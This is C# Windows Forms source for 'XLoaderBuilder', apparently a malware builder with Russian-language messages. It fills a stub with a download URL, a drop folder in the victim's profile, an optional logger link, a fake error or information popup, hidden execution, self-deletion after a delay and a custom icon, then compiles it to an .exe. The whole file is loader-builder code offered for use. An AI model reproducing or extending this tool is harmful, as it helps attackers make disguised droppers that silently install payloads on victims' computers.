using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace XLoaderBuilder
{
    public partial class Form1 : Form
    {

        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
        public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
        public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\";
        public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
        public static readonly string TempPath = Path.GetTempPath();


        public Form1()
        {
            InitializeComponent();
            textBox4.Enabled = false;
            textBox6.Enabled = false;
            textBox7.Enabled = false;
            checkBox5.Enabled = false;
            checkBox6.Enabled = false;
            checkBox7.Enabled = false;
        }

        
        private void button1_Click(object sender, EventArgs e)
        {

            string source = Properties.Resources.stub;
            string path = "";
            string uselogger = "";

            switch (textBox3.Text)
            {
                case "":
                    uselogger = "";
                    break;
                default:
                    uselogger = "1";
                    break;
            }

            if (textBox1.Text == "")
            {
                MessageBox.Show("Укажите ссыку на скачивание файла!", "Не указана ссылка на файл!");
            }


            if (checkBox4.Checked)
            {
                source = source.Replace("#message", "1");
                if (checkBox5.Checked)
                {
                    source = source.Replace("#title", textBox6.Text);
                    source = source.Replace("#text", textBox7.Text);
                    source = source.Replace("#type", "Information");
                }
                if (checkBox6.Checked)
                {
                    source = source.Replace("#title", textBox6.Text);
                    source = source.Replace("#text", textBox7.Text);
                    source = source.Replace("#type", "Question");
                }
                if (checkBox7.Checked)
                {
                    source = source.Replace("#title", textBox6.Text);
                    source = source.Replace("#text", textBox7.Text);
                    source = source.Replace("#type", "Error");
                }
                else
                {
                    source = source.Replace("#title", textBox6.Text);
                    source = source.Replace("#text", textBox7.Text);
                    source = source.Replace("#type", "Error");
                }

            }

            source = source.Replace("#uselogger", uselogger);
            source = source.Replace("#logger", textBox3.Text); 
            source = source.Replace("#url", textBox1.Text);
            source = source.Replace("#name", textBox2.Text);

            switch (comboBox1.Text)
            {
                case "AppData":
                    path = AppDate;
                    break;
                case "LocalData":
                    path = LocalData;
                    break;
                case "Documents":
                    path = MyDocuments;
                    break;
                case "UserProfile":
                    path = UserProfile;
                    break;
                case "Desktop":
                    path = DesktopPath;
                    break;
                case "":
                    path = TempPath;
                    break;
            }
            source = source.Replace("#dlpath", path);

            if (checkBox2.Checked)
            {
                source = source.Replace("#deleting", "1");
                source = source.Replace("#delay", textBox4.Text.ToString());
            }

            if (checkBox3.Checked)
            {
                source = source.Replace("#hidden", "1");
            }

            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Filter = "Executable (*.exe)|*.exe";
                if (saveFile.ShowDialog() == DialogResult.OK)
                {
                    new Compiler(source, saveFile.FileName, textBox5.Text);
                }
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            textBox4.Enabled = true;
        }

        private void button2_Click(object sender, EventArgs e)
        {

            OpenFileDialog openFileDialog1 = new OpenFileDialog();
            openFileDialog1.ShowDialog();
            openFileDialog1.RestoreDirectory = true;
            openFileDialog1.Title = "Choose Icon...";
            openFileDialog1.DefaultExt = "ico";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox5.Text = openFileDialog1.FileName;
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox6.Checked)
            {
                checkBox5.Enabled = false;
                checkBox7.Enabled = false;
            }
            else
            {
                checkBox5.Enabled = true;
                checkBox7.Enabled = true;
            }
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.Checked)
            {
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                checkBox5.Enabled = true;
                checkBox6.Enabled = true;
                checkBox7.Enabled = true;
            }
            else
            {
                textBox6.Enabled = false;
                textBox7.Enabled = false;
                checkBox5.Enabled = false;
                checkBox6.Enabled = false;
                checkBox7.Enabled = false;
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked)
            {
                checkBox6.Enabled = false;
                checkBox7.Enabled = false;
            }
            else
            {
                checkBox6.Enabled = true;
                checkBox7.Enabled = true;
            }
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox7.Checked)
            {
                checkBox6.Enabled = false;
                checkBox5.Enabled = false;
            }
            else
            {
                checkBox6.Enabled = true;
                checkBox5.Enabled = true;
            }
        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }
    }

}

